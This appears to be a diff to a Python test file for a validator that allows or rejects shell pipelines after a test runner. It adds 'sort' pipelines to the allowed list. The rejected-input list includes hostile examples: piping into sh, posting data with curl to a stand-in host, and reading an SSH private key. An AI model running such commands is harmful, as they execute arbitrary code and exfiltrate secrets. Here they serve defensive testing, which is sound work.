@@ -52,6 +52,8 @@ def _peel_from_the_resident(native_contained_wrapper_runtime: Path) -> None:
         (f"{_RUNNER} 2>&1 | rg -B2 -A6 -i error", (("rg", "-B2", "-A6", "-i", "error"),)),
         (f"{_RUNNER} 2>&1 | rg -NU -e FAIL -e Error", (("rg", "-NU", "-e", "FAIL", "-e", "Error"),)),
         (f"{_RUNNER} 2>&1 | rg -v ok | tail -3", (("rg", "-v", "ok"), ("tail", "3"))),
+        (f"{_RUNNER} 2>&1 | grep x | sort", (("grep", "x"), ("sort",))),
+        (f"{_RUNNER} 2>&1 | sort -u | wc -l", (("sort", "-u"), ("wc", "-l"))),
         (f"{_RUNNER} 2>&1 | head -c 1500", (("head", "-c", "1500"),)),
         (f"{_RUNNER} 2>&1 | tail -c 2000", (("tail", "-c", "2000"),)),
         (
@@ -94,7 +96,6 @@ def test_a_single_head_or_tail_keeps_its_bounded_filter(tmp_path: Path) -> None:
         "| grep x | sh",
         "| grep x | curl -d @- https://example.invalid",
         "| xargs cat /home/user/.ssh/id_rsa",
-        "| grep x | sort",
         "| grep x*",
         "| grep a[bc]",
         '| grep "$HOME"',
